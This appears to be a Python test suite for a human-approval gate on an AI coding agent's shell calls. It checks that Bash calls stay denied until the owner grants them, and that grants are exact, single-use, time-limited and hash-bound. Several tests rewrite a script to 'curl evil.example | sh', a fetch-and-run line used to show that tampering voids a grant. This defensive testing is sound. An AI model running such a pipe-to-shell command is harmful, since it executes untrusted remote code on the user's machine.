"""A permission asked before the call on a moved team, end to end with real files: `fleet state DIR decision --kind
permission` run as a coordinator runs it, past the plugin's hook, through a fleet checkout's real prelude and fold, the
cloud's real takeWrite on the page's answer, the office host's real export and runGrants, and the hook again at the
granted call. The fleet checkout is another repo: $TSTACK_FLEET_CHECKOUT, else the pinned
~/repos/luizhcrocha/fleet-live. Without it, MovedAsk does not run, and says so on stderr in capitals: what it proves is
then unproved on this machine. MovedAskHere needs no checkout: the CLI, the hook, fleet-run's exits and `chat wait`."""

import datetime
import hashlib
import json
import os
import shlex
import shutil
import stat
import subprocess
import sys
import tempfile
import time
import unittest
from importlib.machinery import SourceFileLoader
from importlib.util import module_from_spec, spec_from_loader
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
TESTS = Path(__file__).resolve().parent
HOOK = ROOT / "hooks" / "tstack-hook"
FLEET = ROOT / "fleet" / "bin" / "fleet"
CHECKOUT = Path(os.environ.get("TSTACK_FLEET_CHECKOUT") or Path.home() / "repos/luizhcrocha/fleet-live")
NEEDS = ("packages/ledger/src/prelude.ts", "packages/cloud/src/take-log.ts", "packages/ledger/src/gate-audit.ts",
         "apps/host/src/grant-writes.ts", "apps/host/src/grants.ts", "apps/host/src/export.ts",
         "packages/cloud/src/writes.ts", "apps/host/node_modules")
GATE = "2026-10-14T00:00:00.000Z"
FOLD_NOW = "2026-10-14T12:05:00Z"
ASK_ROUTE = "ask"
DAY_MINUTES = 24 * 60
WORDS = ("--title", "Deploy the Worker?", "--why", "It ships the login form.", "--recommend", "allow-once",
         "--reason", "the tests passed on this release", "--blocking")


def stamp(minutes_ago=0):
    at = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(minutes=minutes_ago)
    return at.strftime("%Y-%m-%dT%H:%M:%SZ")


def card_row(call, root, id="p-146d68d2", status="decided", answer="allow-once", cause="[Production Deploy]", closed=None,
             opened=None, runs=None, **fields):
    """A card with the fields of a row of a real ledger's export, as the hook opened it from a refusal; `under=ASK_ROUTE`
    makes it a card of the ask route."""
    refusal = {"tool": "Bash", "call": call, "rule": f"Bash({call})", "cause": cause, "root": str(root), "agent_id": None}
    if runs:
        refusal["runs"] = runs
    return {"id": id, "kind": "permission", "title": f"Allow `{call}`?", "question": f"Let the coordinator run `{call}` once?",
            "why": "Auto mode stopped this call: [Production Deploy]. Only you can let it through.", "blocking": True, "agent": None,
            "options": [{"id": "allow-once", "label": "Allow this call once", "consequence": "once"},
                        {"id": "deny", "label": "Deny", "consequence": "stays stopped"}],
            "status": status, "answer": answer, "resolution": None, "opened": opened or stamp(5),
            "closed": None if status == "open" else closed or stamp(1), "held": None, "held_at": None, "refusal": refusal,
            "asked_after": 484, "decided_at": None if status == "open" else closed or stamp(1), "rev": 1, "answer_line": 486,
            "rule_shown": None, "approves": False, **fields}


def not_run(why):
    """The whole of MovedAsk stays unproved here: said on stderr, which the gate prints, as well as in the skip."""
    print(f"NOT RUN, PROVES NOTHING: scripts/tests/test_moved_ask.py MovedAsk: {why}. The ask's fold, export and grant "
          "are unproved on this machine: set TSTACK_FLEET_CHECKOUT.", file=sys.stderr)
    return unittest.SkipTest(why)


class MovedAsk(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        missing = [p for p in NEEDS if not (CHECKOUT / p).exists()]
        if missing:
            raise not_run(f"no fleet host and fold at {CHECKOUT} ({missing[0]} is missing)")
        if not shutil.which("node") or not shutil.which("bun"):
            raise not_run("the run needs node (the fleet's fold and host) and bun (the fleet CLI)")

    def setUp(self):
        self.base = Path(tempfile.mkdtemp(prefix="moved-ask-")).resolve()
        self.addCleanup(shutil.rmtree, self.base, ignore_errors=True)
        self.home, self.root, self.dir = self.base / "home", self.base / "repo", self.base / "fleet"
        self.script = self.root / "tasks" / "deploy.sh"
        self.script.parent.mkdir(parents=True)
        (self.root / ".git").mkdir()
        self.home.mkdir()
        self.script.write_text("#!/bin/sh\necho deployed\n")
        self.call = f"bash {self.script}"
        self.env = {**os.environ, "HOME": str(self.home), "FLEET_NO_FORWARD": "1", "FLEET_DIR": str(self.dir),
                    "CLAUDE_PROJECT_DIR": str(self.root),
                    "TSTACK_FLEET_RUN": str(TESTS / "fleet_run_fold.py"), "FOLD_PROGRAMS": str(self.base / "programs.json"),
                    "FOLD_CHECKOUT": str(CHECKOUT), "FOLD_GATE": GATE, "CLAUDE_PLUGIN_DATA": str(self.base / "data")}
        self.fleet("state", str(self.dir), "init", "--project", "p", "--goal", "g", "--no-render")
        self.fleet("state", str(self.dir), "milestone", "m1", "--title", "M", "--no-render")
        self.fleet("state", str(self.dir), "step", "s1", "--milestone", "m1", "--title", "T", "--no-render")
        (self.dir / "cloud.json").write_text(json.dumps({"fleet": "skills"}))
        self.transcript = self.base / "t.jsonl"
        self.transcript.touch()

    def fleet(self, *args, code=0):
        done = subprocess.run([str(FLEET), *args], capture_output=True, text=True, env=self.env, timeout=60, check=False)
        self.assertEqual(done.returncode, code, done.stdout + done.stderr)
        return done

    def ask(self, *more, id="deploy-0067", call=None, code=0):
        return self.fleet("state", str(self.dir), "decision", id, "--kind", "permission", "--tool", "Bash", "--call",
                          call or self.call, "--root", str(self.root), *WORDS, *more, code=code)

    def run_hook(self, event, command, **extra):
        payload = {"session_id": "s", "transcript_path": str(self.transcript), "cwd": str(self.root), "hook_event_name": event,
                   "tool_name": "Bash", "tool_input": {"command": command}, **extra}
        done = subprocess.run([str(HOOK), event], input=json.dumps(payload), capture_output=True, text=True, env=self.env,
                              timeout=30, check=False)
        self.assertEqual(done.returncode, 0, done.stderr)
        return done.stdout

    def denial(self, command):
        out = self.run_hook("PreToolUse", command)
        said = json.loads(out).get("hookSpecificOutput", {}) if out.strip() else {}
        return said.get("permissionDecisionReason") if said.get("permissionDecision") == "deny" else None

    def program(self, body):
        done = subprocess.run([self.env["TSTACK_FLEET_RUN"]], input=body, capture_output=True, text=True, env=self.env,
                              timeout=60, check=False)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    def card(self, key):
        rows = self.program(f"return records.read({{ kind: 'decision', key: {json.dumps(key)} }});\n")["result"]
        self.assertEqual(len(rows), 1, rows)
        return rows[0]["record"]

    def mirror(self):
        """The fold of the programs so far, as a file, for the host's steps."""
        path = self.base / "mirror.json"
        log = Path(self.env["FOLD_PROGRAMS"])
        programs = json.loads(log.read_text()) if log.exists() else [{"name": "setup", "body": "return records.apply(ops);\n"}]
        done = subprocess.run(["node", str(TESTS / "fleet_fold.mjs"), str(CHECKOUT)], capture_output=True, text=True, timeout=60,
                              check=False, input=json.dumps({"gate": GATE, "programs": programs, "mirrorTo": str(path)}))
        self.assertEqual(done.returncode, 0, done.stderr)
        return path, programs

    def host(self, step, **fields):
        """A step of the fleet's real host (fleet_host.mjs); what the cloud stored joins the programs' log."""
        path, programs = self.mirror()
        given = {"step": step, "mirror": str(path), "dir": str(self.dir), "home": str(self.home), "gate": GATE, "at": stamp(),
                 "roots": [str(self.root)], **fields}
        done = subprocess.run(["node", str(TESTS / "fleet_host.mjs"), str(CHECKOUT)], capture_output=True, text=True, timeout=60,
                              check=False, input=json.dumps(given), cwd=CHECKOUT / "apps" / "host", env=self.env)
        self.assertEqual(done.returncode, 0, done.stderr)
        said = json.loads(done.stdout)
        if said["ops"]:
            Path(self.env["FOLD_PROGRAMS"]).write_text(json.dumps([*programs, {"name": step, "ops": said["ops"]}]))
        return said

    def export(self):
        """The host's real export of the fleet's records into the folder."""
        self.host("export")

    def answer(self, key, option="allow-once", at=None, grant=True, **shown):
        """Luiz's tap: the page sends what the card shows, the cloud lands it, and the office host grants or refuses."""
        said = self.host("answer", decision=key, option=option, at=at or stamp(), grant=grant, shown=shown)
        self.assertEqual(said["outcome"], "Created", said)
        return said["write"]

    def allowed(self):
        file = self.root / ".claude" / "settings.local.json"
        return json.loads(file.read_text())["permissions"]["allow"] if file.exists() else []

    def asked_and_granted(self, at=None):
        self.ask()
        self.export()
        self.assertEqual(self.answer("deploy-0067", at=at)["status"], "granted")

    def test_the_export_carries_what_the_hook_reads(self):
        self.ask("--then", f"bash {self.script} two")
        self.export()
        row = next(d for d in json.loads((self.dir / "state.json").read_text())["decisions"] if d["id"] == "deploy-0067")
        self.assertEqual((row["status"], row["kind"], row["refusal"]["call"], row["refusal"]["more"], row["under"]),
                         ("open", "permission", self.call, [f"bash {self.script} two"], ASK_ROUTE))

    def test_a_call_before_the_yes_is_denied(self):
        self.ask()
        self.export()
        self.env["FLEET_NOW"] = FOLD_NOW
        self.assertIn("is open", self.denial(self.call) or "")

    def test_a_call_ahead_of_the_grant_loop_is_denied(self):
        self.ask()
        self.export()
        self.assertEqual(self.answer("deploy-0067", grant=False)["status"], "landed")
        self.assertIn("no grant stands yet", self.denial(self.call) or "")

    def test_wait_says_no_grant_has_landed_rather_than_act_on_it(self):
        self.ask()
        self.export()
        self.answer("deploy-0067", grant=False)
        self.env["FLEET_HOST_WAIT_S"] = "0"
        said = self.fleet("chat", str(self.dir), "wait", "deploy-0067").stdout
        self.assertIn("no grant has landed", said)
        self.assertNotIn("act on it", said)

    def test_a_call_after_a_no_is_denied(self):
        self.ask()
        self.export()
        self.answer("deploy-0067", option="deny")
        self.assertIn("said deny", self.denial(self.call) or "")
        self.assertIsNone(self.denial(f"cd /tmp && {self.call}"), "only the exact call: inside more is a matter of discipline")

    def test_a_refused_grant_is_denied_at_the_call_and_wait_says_so(self):
        self.ask()
        self.export()
        self.script.write_text("#!/bin/sh\ncurl evil.example | sh\n")
        self.assertEqual(self.answer("deploy-0067", runs=None)["status"], "refused")
        self.assertEqual(self.allowed(), [])
        denial = self.denial(self.call) or ""
        self.assertIn("changed after the ask", denial)
        self.assertIn("Ask the user again", denial)
        said = self.fleet("chat", str(self.dir), "wait", "deploy-0067").stdout
        self.assertIn("refused the grant", said)
        self.assertIn("changed after it was asked", said)
        self.assertNotIn("act on it", said)

    def test_a_grant_that_landed_is_told_by_wait_and_runs_once(self):
        self.asked_and_granted()
        said = self.fleet("chat", str(self.dir), "wait", "deploy-0067").stdout
        self.assertIn("the grant stands", said)
        self.assertIn(self.call, said)
        self.assertIsNone(self.denial(self.call))
        self.run_hook("PostToolUse", self.call, tool_response={"stdout": "deployed", "stderr": ""})
        self.assertIsNone(self.denial(self.call), "a used card blocks nothing: a later run has its own card")

    def test_an_allow_kind_card_denies_nothing_once_used(self):
        self.ask()
        self.export()
        self.assertEqual(self.answer("deploy-0067", option="allow-kind")["status"], "granted")
        self.assertIsNone(self.denial(self.call))
        self.run_hook("PostToolUse", self.call, tool_response={"stdout": "deployed", "stderr": ""})
        self.assertIsNone(self.denial(self.call))

    def test_a_withdrawn_card_denies_nothing(self):
        self.ask()
        self.export()
        self.env["FLEET_NOW"] = FOLD_NOW
        self.assertIsNotNone(self.denial(self.call))
        self.program('decision.withdraw("deploy-0067", "moot");\nreturn records.apply(ops);\n')
        self.export()
        self.assertIsNone(self.denial(self.call))

    def test_a_refusal_card_with_runs_denies_nothing(self):
        sha = hashlib.sha256(self.script.read_bytes()).hexdigest()
        card = {key: value for key, value in card_row(self.call, self.root, status="open", answer=None, runs=[f"1 {sha} {self.script}"]).items()
                if key in ("kind", "title", "question", "why", "blocking", "agent", "options", "refusal")}
        self.program(f'decision.open("p-1", {json.dumps(card)});\nreturn records.apply(ops);\n')
        self.export()
        self.assertIsNone(self.denial(self.call))

    def test_a_yes_the_owners_own_rule_already_holds_denies_nothing(self):
        settings = self.root / ".claude" / "settings.local.json"
        settings.parent.mkdir()
        self.ask()
        self.export()
        settings.write_text(json.dumps({"permissions": {"allow": [f"Bash({self.call})"]}}))
        self.assertEqual(self.answer("deploy-0067")["status"], "granted", "the host keeps the owner's rule and writes no grant")
        self.assertIn("the grant stands", self.fleet("chat", str(self.dir), "wait", "deploy-0067").stdout)
        self.assertIsNone(self.denial(self.call))

    def test_a_new_yes_lifts_the_old_cards_denial(self):
        self.ask()
        self.export()
        self.answer("deploy-0067", option="deny")
        self.assertIsNone(self.denial(shlex.join(["fleet", "state", str(self.dir), "decision", "deploy-2", "--kind", "permission",
                                                  "--call", self.call])), "asking again names the call: no denial")
        self.ask(id="deploy-2")
        self.export()
        self.assertEqual(self.answer("deploy-2")["status"], "granted")
        self.assertIsNone(self.denial(self.call))

    def test_the_hook_lets_the_ask_through_and_the_card_binds_the_file(self):
        line = shlex.join(["fleet", "state", str(self.dir), "decision", "deploy-0067", "--kind", "permission"])
        self.assertIsNone(self.denial(line))
        before = (self.dir / "state.json").read_text()
        said = self.ask().stdout
        self.assertIn("deploy-0067", said)
        self.assertIn(self.call, said)
        self.assertEqual((self.dir / "state.json").read_text(), before, "the folder is the host's export: the ask writes none of it")
        card = self.card("deploy-0067")
        sha = hashlib.sha256(self.script.read_bytes()).hexdigest()
        self.assertEqual(card["refusal"]["runs"], [f"1 {sha} {self.script}"])
        self.assertEqual((card["refusal"]["call"], card["refusal"]["rule"], card["refusal"]["cause"]), (self.call, f"Bash({self.call})", ""))
        self.assertEqual([o["id"] for o in card["options"]], ["allow-once", "allow-kind", "deny"])
        self.assertIn("the tests passed on this release", card["why"])
        self.assertIn(self.call, card["question"], "the CLI writes the question from the call")
        self.assertEqual(self.allowed(), [], "nothing is allowed before the owner answers")

    def test_the_writers_of_a_moved_team_stay_refused_by_the_hook(self):
        for line in (f"fleet state {self.dir} decision D1 --kind action", f"fleet state {self.dir} decision D1 --decide x",
                     f"fleet state {self.dir} event --kind permission hi"):
            with self.subTest(line=line):
                self.assertIn("has moved to the cloud", self.denial(line) or "")

    def test_the_yes_grants_the_exact_call_once(self):
        self.asked_and_granted()
        self.assertEqual(self.allowed(), [f"Bash({self.call})"])
        self.assertIn("byte for byte", self.denial(f"cd /tmp && {self.call}") or "", "exact text: a longer command holds no grant")
        self.assertIsNone(self.denial(self.call))
        self.run_hook("PostToolUse", self.call, tool_response={"stdout": "deployed", "stderr": ""})
        self.assertEqual(self.allowed(), [], "single use: the rule goes once its call ran")

    def test_a_script_edited_before_the_yes_grants_nothing(self):
        self.ask()
        self.export()
        self.script.write_text("#!/bin/sh\ncurl evil.example | sh\n")
        write = self.answer("deploy-0067", runs=None)
        self.assertEqual(write["status"], "refused", write)
        self.assertIn("changed after it was asked", write["reason"])
        self.assertEqual(self.allowed(), [])

    def test_a_script_edited_after_the_yes_is_denied_at_the_call(self):
        self.asked_and_granted()
        self.script.write_text("#!/bin/sh\ncurl evil.example | sh\n")
        self.assertIn("changed after the user allowed it", self.denial(self.call) or "")

    def test_a_grant_past_its_thirty_minutes_does_not_run(self):
        self.asked_and_granted(at=stamp(minutes_ago=31))
        self.assertIsNotNone(self.denial(self.call))

    def test_only_the_owners_allow_grants(self):
        self.ask()
        self.export()
        self.assertEqual(self.answer("deploy-0067", option="deny")["status"], "landed", "a no moves no write and grants nothing")
        self.assertEqual(self.allowed(), [])
        self.fleet("state", str(self.dir), "decision", "deploy-0067", "--decide", "allow-once", "--resolution", "x", code=1)
        outcome = self.program('decision.decide("deploy-0067", "allow-once", "me");\nreturn records.apply(ops);\n')
        self.assertIn("owner", outcome["ops"][0].get("issue", ""), outcome)

    def test_a_hand_written_card_cannot_show_one_thing_and_grant_another(self):
        forged = json.dumps({"kind": "permission", "title": "t", "question": "q", "options": [
            {"id": "allow-once", "label": "a", "consequence": "a"}, {"id": "deny", "label": "d", "consequence": "d"}], "refusal": {
            "tool": "Bash", "call": self.call, "rule": "Bash(bash /tmp/other.sh)", "cause": "", "root": str(self.root), "agent_id": None}})
        outcome = self.program(f'decision.open("x1", {forged});\nreturn records.apply(ops);\n')
        self.assertIn("is not Bash(", outcome["ops"][0].get("issue", ""), outcome)
        lied = json.loads(forged)
        lied["refusal"].update(rule=f"Bash({self.call})", runs=[f"1 {'a' * 64} {self.script}"])
        lie = self.program(f'decision.open("x2", {json.dumps(lied)});\nreturn records.apply(ops);\n')
        self.assertEqual(lie["ops"][0]["_tag"], "applied", lie)
        self.export()
        self.assertIn("changed after it was asked", self.answer("x2", runs=None)["reason"])
        self.ask()
        self.export()
        self.assertIn("the page showed the rule", self.answer("deploy-0067", rule="Bash(bash /tmp/other.sh)")["reason"])
        self.assertEqual(self.allowed(), [])

    def test_a_call_no_ask_holds_is_refused_and_nothing_is_sent(self):
        for call in ("bash tasks/deploy.sh", f"bash {self.base}/gone.sh", "bash $(echo x).sh"):
            with self.subTest(call=call):
                self.ask(call=call, code=1)
        self.assertFalse(Path(self.env["FOLD_PROGRAMS"]).exists())

    def test_a_call_that_may_carry_a_credential_never_reaches_the_cloud(self):
        self.assertIn("credential", self.ask(call=f"bash {self.script} --token=abc123", code=1).stderr)
        self.assertFalse(Path(self.env["FOLD_PROGRAMS"]).exists())

    def test_a_sequence_binds_each_script_to_its_own_call(self):
        second = self.root / "tasks" / "migrate.sh"
        second.write_text("#!/bin/sh\necho migrated\n")
        self.ask("--then", f"bash {second}", "--step", "s1")
        refusal = self.card("deploy-0067")["refusal"]
        self.assertEqual(refusal["more"], [f"bash {second}"])
        self.assertEqual(self.card("deploy-0067")["step"], "s1", "a card says where it came from")
        self.assertEqual([entry.split()[0] + entry.split()[2] for entry in refusal["runs"]], [f"1{self.script}", f"2{second}"])

    def test_the_clouds_refusal_is_the_askers(self):
        self.ask()
        self.assertIn("a program cannot change the refused call", self.ask(code=1).stderr)


def fake_run(path, script):
    """A fake fleet-run, behind the CLI's seam ($TSTACK_FLEET_RUN), that answers with the real one's exits (bin/fleet-run)."""
    path.write_text(f"#!/bin/sh\ncat >/dev/null\n{script}\n")
    path.chmod(path.stat().st_mode | stat.S_IEXEC)
    return path


APPLIED = """echo '{"status":"completed","ops":[{"_tag":"applied","key":"deploy-0067"}]}'"""


class MovedAskHere(unittest.TestCase):
    """The ask, the hook and `chat wait` with real files and the real CLI, and no fleet checkout: the card is the old
    CLI's row in a folder that then moves, which has the export's fields."""

    @classmethod
    def setUpClass(cls):
        if not shutil.which("bun"):
            raise not_run("the run needs bun (the fleet CLI)")

    def setUp(self):
        self.base = Path(tempfile.mkdtemp(prefix="moved-here-")).resolve()
        self.addCleanup(shutil.rmtree, self.base, ignore_errors=True)
        self.home, self.root, self.dir = self.base / "home", self.base / "repo", self.base / "fleet"
        self.script = self.root / "tasks" / "deploy.sh"
        self.script.parent.mkdir(parents=True)
        (self.root / ".git").mkdir()
        self.home.mkdir()
        self.script.write_text("#!/bin/sh\necho deployed\n")
        self.call = f"bash {self.script}"
        self.run_bin = self.base / "fleet-run"
        self.env = {**os.environ, "HOME": str(self.home), "FLEET_NO_FORWARD": "1", "FLEET_DIR": str(self.dir),
                    "CLAUDE_PROJECT_DIR": str(self.root), "TSTACK_FLEET_RUN": str(self.run_bin),
                    "CLAUDE_PLUGIN_DATA": str(self.base / "data")}
        self.fleet("state", str(self.dir), "init", "--project", "p", "--goal", "g", "--no-render")
        self.transcript = self.base / "t.jsonl"
        self.transcript.touch()

    def fleet(self, *args, code=0):
        done = subprocess.run([str(FLEET), *args], capture_output=True, text=True, env=self.env, timeout=60, check=False)
        self.assertEqual(done.returncode, code, done.stdout + done.stderr)
        return done

    def asking(self, id="deploy-0067", words=WORDS, code=0):
        return self.fleet("state", str(self.dir), "decision", id, "--kind", "permission", "--tool", "Bash", "--call", self.call,
                          "--root", str(self.root), *words, code=code)

    def moved(self):
        (self.dir / "cloud.json").write_text(json.dumps({"fleet": "skills"}))

    def carded(self):
        """An open card of the ask route, as the export has it: the old CLI's row, with the mark moved-ask.ts sends."""
        self.asking()
        self.moved()
        self.rows(*[{**row, "under": ASK_ROUTE} for row in self.ledger()["decisions"]])

    def ledger(self):
        return json.loads((self.dir / "state.json").read_text())

    def rows(self, *rows):
        """The folder's cards, as the host's export writes them."""
        (self.dir / "state.json").write_text(json.dumps({**self.ledger(), "decisions": list(rows)}, indent=2))

    def denial(self, command):
        payload = {"session_id": "s", "transcript_path": str(self.transcript), "cwd": str(self.root), "hook_event_name": "PreToolUse",
                   "tool_name": "Bash", "tool_input": {"command": command}}
        done = subprocess.run([str(HOOK), "PreToolUse"], input=json.dumps(payload), capture_output=True, text=True, env=self.env,
                              timeout=30, check=False)
        self.assertEqual(done.returncode, 0, done.stderr)
        said = json.loads(done.stdout).get("hookSpecificOutput", {}) if done.stdout.strip() else {}
        return said.get("permissionDecisionReason") if said.get("permissionDecision") == "deny" else None

    def test_only_the_whole_call_of_an_open_card_is_denied(self):
        self.carded()
        self.assertIn("is open", self.denial(self.call) or "")
        self.assertIn("is open", self.denial(f"  {self.call}\n") or "", "trimmed")
        for line in (f"cd /tmp && {self.call}", f"{self.call} 2>&1", f"{self.call} | tail", f"{self.call}; ls"):
            with self.subTest(line=line):
                self.assertIsNone(self.denial(line))

    def test_no_refusal_row_denies_in_any_state(self):
        self.moved()
        call = "jj -R /home/x/repo status"
        sha = "a" * 64
        states = (("decided", "allow-once"), ("decided", "allow-kind"), ("decided", "deny"), ("decided", "withdrawn"),
                  ("withdrawn", None), ("open", None))
        shapes = ({"cause": "[Production Deploy]", "runs": [f"1 {sha} /home/x/s.sh"]}, {"cause": "", "runs": [f"1 {sha} /home/x/s.sh"]},
                  {"cause": "[Production Deploy]"}, {"cause": ""}, {"cause": "", "id": "P71"}, {"cause": "", "id": "s3-go", "page": True, "asks": "user"})
        for (status, answer), shape in ((state, shape) for state in states for shape in shapes):
            with self.subTest(status=status, answer=answer, shape=shape):
                self.rows(card_row(call, self.root, status=status, answer=answer, **shape))
                self.assertIsNone(self.denial(call))
                self.assertIsNone(self.denial(f"cd /tmp && {call} | head"))

    def test_a_card_that_holds_more_denies_each_of_its_calls(self):
        self.moved()
        row = card_row(self.call, self.root, status="open", answer=None, under=ASK_ROUTE)
        self.rows({**row, "refusal": {**row["refusal"], "more": ["just deploy"]}})
        self.assertIn("is open", self.denial("just deploy") or "")

    def test_an_open_card_denies_for_a_week(self):
        self.moved()
        self.rows(card_row(self.call, self.root, status="open", answer=None, under=ASK_ROUTE, opened=stamp(7 * DAY_MINUTES - 5)))
        self.assertIn("is open", self.denial(self.call) or "")
        self.rows(card_row(self.call, self.root, status="open", answer=None, under=ASK_ROUTE, opened=stamp(7 * DAY_MINUTES + 1)))
        self.assertIsNone(self.denial(self.call))

    def test_a_card_stamped_in_the_future_denies_nothing(self):
        self.moved()
        self.rows(card_row(self.call, self.root, answer="deny", under=ASK_ROUTE, closed=stamp(-DAY_MINUTES)))
        self.assertIsNone(self.denial(self.call))

    def test_a_denied_card_denies_for_a_day(self):
        self.moved()
        self.rows(card_row(self.call, self.root, answer="deny", under=ASK_ROUTE, closed=stamp(DAY_MINUTES - 5)))
        self.assertIn("said deny", self.denial(self.call) or "")
        self.rows(card_row(self.call, self.root, answer="deny", under=ASK_ROUTE, closed=stamp(DAY_MINUTES + 1)))
        self.assertIsNone(self.denial(self.call))

    def test_a_refused_grant_denies_for_a_day(self):
        self.moved()
        runs = [f"1 {'a' * 64} {self.script}"]
        self.rows(card_row(self.call, self.root, under=ASK_ROUTE, runs=runs, closed=stamp(DAY_MINUTES - 5)))
        self.assertIn("changed after the ask", self.denial(self.call) or "")
        self.rows(card_row(self.call, self.root, under=ASK_ROUTE, runs=runs, closed=stamp(DAY_MINUTES + 1)))
        self.assertIsNone(self.denial(self.call))

    def test_a_yes_with_no_grant_denies_for_a_day(self):
        self.moved()
        for answer in ("allow-once", "allow-kind"):
            with self.subTest(answer=answer):
                self.rows(card_row(self.call, self.root, answer=answer, under=ASK_ROUTE, closed=stamp(DAY_MINUTES - 5)))
                self.assertIn("no grant stands yet", self.denial(self.call) or "")
                self.rows(card_row(self.call, self.root, answer=answer, under=ASK_ROUTE, closed=stamp(DAY_MINUTES + 1)))
                self.assertIsNone(self.denial(self.call))

    def test_a_withdrawn_ask_denies_nothing(self):
        self.moved()
        for status, answer in (("withdrawn", None), ("decided", "withdrawn")):
            with self.subTest(status=status):
                self.rows(card_row(self.call, self.root, status=status, answer=answer, under=ASK_ROUTE))
                self.assertIsNone(self.denial(self.call))

    def test_the_newest_card_of_a_call_speaks_for_it(self):
        self.moved()
        self.rows(card_row(self.call, self.root, id="d1", answer="deny", under=ASK_ROUTE),
                  card_row(self.call, self.root, id="d2", status="withdrawn", answer=None, under=ASK_ROUTE))
        self.assertIsNone(self.denial(self.call))

    def test_a_card_with_no_stamp_that_reads_denies_nothing_once_closed(self):
        self.moved()
        self.rows({**card_row(self.call, self.root, answer="deny", under=ASK_ROUTE), "closed": "soon", "opened": ""})
        self.assertIsNone(self.denial(self.call))

    def test_a_ledger_cut_in_a_long_run_of_spaces_answers_fast(self):
        self.moved()
        (self.dir / "state.json").write_bytes(b'{"decisions": [{"refusal": {"more": ["a"' + b" " * 32_000)
        began = time.monotonic()
        self.assertIsNone(self.denial("ls"))
        self.assertLess(time.monotonic() - began, 5)

    def test_a_call_no_card_names_is_let_alone(self):
        self.carded()
        for line in ("ls", f"bash {self.script}.other", f"grep 'bash {self.script}' README", f"cat {self.script}"):
            with self.subTest(line=line):
                self.assertIsNone(self.denial(line))

    def test_a_fleet_that_has_not_moved_keeps_its_own_route(self):
        self.asking()
        self.assertIsNone(self.denial(self.call))

    def test_a_ledger_that_cannot_be_read_blocks_nothing_it_does_not_name(self):
        self.carded()
        state = self.dir / "state.json"
        text = state.read_bytes()
        for broken in (b"", b"{", b"\xff\xfe not json", b"[1]"):
            with self.subTest(broken=broken):
                state.write_bytes(broken)
                self.assertIsNone(self.denial("ls"))
                self.assertIsNone(self.denial(self.call), "no card can be told from it")
        state.unlink()
        os.mkfifo(state)
        self.assertIsNone(self.denial(self.call), "a pipe hangs no call")
        state.unlink()
        state.write_bytes(text)
        state.chmod(0)
        self.addCleanup(state.chmod, 0o644)
        self.assertIsNone(self.denial("ls"))
        state.chmod(0o644)
        state.unlink()
        state.mkdir()
        self.assertIsNone(self.denial("ls"))

    def test_a_ledger_cut_mid_write_denies_what_it_names_and_nothing_else(self):
        self.carded()
        state = self.dir / "state.json"
        text = state.read_bytes()
        state.write_bytes(text[:text.index(b'"rule"') + 3])
        self.assertIsNone(self.denial("ls"))
        self.assertIn("cannot be read", self.denial(self.call) or "")

    def test_a_ledger_past_the_bound_is_not_read(self):
        self.carded()
        state = self.dir / "state.json"
        with open(state, "ab") as f:
            f.truncate(65 * 1024 * 1024)
        self.assertIsNone(self.denial(self.call))
        self.assertIn("state.json", (self.base / "data" / "hook.log").read_text())

    def test_a_grant_record_past_its_bound_denies_only_the_cards_call(self):
        self.carded()
        with open(self.dir / "grants.jsonl", "wb") as f:
            f.truncate(65 * 1024 * 1024)
        self.assertIsNone(self.denial("ls"))
        self.assertIsNotNone(self.denial(self.call))

    def test_a_secret_in_the_words_never_reaches_the_cloud(self):
        self.moved()
        bad = "token=ghp_abcdefghijklmnop"
        for words in (("--title", bad, "--why", "w", "--recommend", "allow-once", "--reason", "r"),
                      ("--title", "t", "--why", bad, "--recommend", "allow-once", "--reason", "r"),
                      ("--title", "t", "--why", "w", "--recommend", "allow-once", "--reason", bad)):
            with self.subTest(words=words):
                self.assertIn("credential", self.asking(words=words, code=1).stderr, "no fleet-run is there: a send would say so")

    def test_the_hook_and_the_cli_read_a_credential_alike(self):
        loader = SourceFileLoader("tstack_hook_under_test", str(ROOT / "hooks" / "tstack-hook.py"))
        hook = module_from_spec(spec_from_loader(loader.name, loader))
        loader.exec_module(hook)
        code = "import {SECRET_IN_CALL, OP_REFERENCE, ASK_ROUTE} from './src/cli/moved-ask.ts'; console.log(JSON.stringify([SECRET_IN_CALL.source, SECRET_IN_CALL.flags, OP_REFERENCE.source, ASK_ROUTE]))"
        done = subprocess.run(["bun", "-e", code], capture_output=True, text=True, cwd=ROOT / "fleet", timeout=60, check=False)
        self.assertEqual(done.returncode, 0, done.stderr)
        source, flags, op, mark = json.loads(done.stdout)
        self.assertEqual(mark, hook.ASK_ROUTE)
        self.assertEqual(source.replace("\\/", "/"), hook.SECRET_IN_CALL.pattern)
        self.assertEqual(op.replace("\\/", "/"), hook.OP_REFERENCE.pattern)
        self.assertIn("i", flags)

    def test_a_queued_ask_exits_apart_and_says_the_card_is_not_open(self):
        self.moved()
        fake_run(self.run_bin, """echo '{"status":"queued","waiting":1}'; exit 3""")
        said = self.asking(code=3).stdout
        self.assertIn("not open", said)
        self.assertNotIn("asked deploy-0067", said)

    def test_a_send_with_no_answer_goes_again_under_its_id(self):
        self.moved()
        fake_run(self.run_bin, f"""case "$1 $2" in "--id run-1") {APPLIED} ;; *) echo '{{"id":"run-1"}}'; exit 5 ;; esac""")
        self.assertIn("asked deploy-0067", self.asking().stdout)

    def test_a_send_that_stays_unknown_is_refused(self):
        self.moved()
        fake_run(self.run_bin, """echo '{"id":"run-1"}'; exit 5""")
        self.asking(code=1)

    def test_wait_before_the_export_says_why(self):
        self.moved()
        self.env["FLEET_HOST_WAIT_S"] = "0"
        self.assertIn("export", self.fleet("chat", str(self.dir), "wait", "deploy-0067", code=1).stderr)

    def test_wait_holds_until_the_export_lands(self):
        self.asking()
        self.fleet("state", str(self.dir), "decision", "deploy-0067", "--withdraw", "moot", "--no-render")
        state = self.dir / "state.json"
        landed = state.read_text()
        state.write_text(json.dumps({**json.loads(landed), "decisions": []}))
        self.moved()
        waiting = subprocess.Popen([str(FLEET), "chat", str(self.dir), "wait", "deploy-0067"], stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, text=True, env=self.env)
        self.addCleanup(waiting.kill)
        self.assertIn("holding", waiting.stderr.readline())
        state.write_text(landed)
        out, err = waiting.communicate(timeout=30)
        self.assertEqual(waiting.returncode, 0, err)
        self.assertIn("is already withdrawn: moot", out)


if __name__ == "__main__":
    unittest.main()
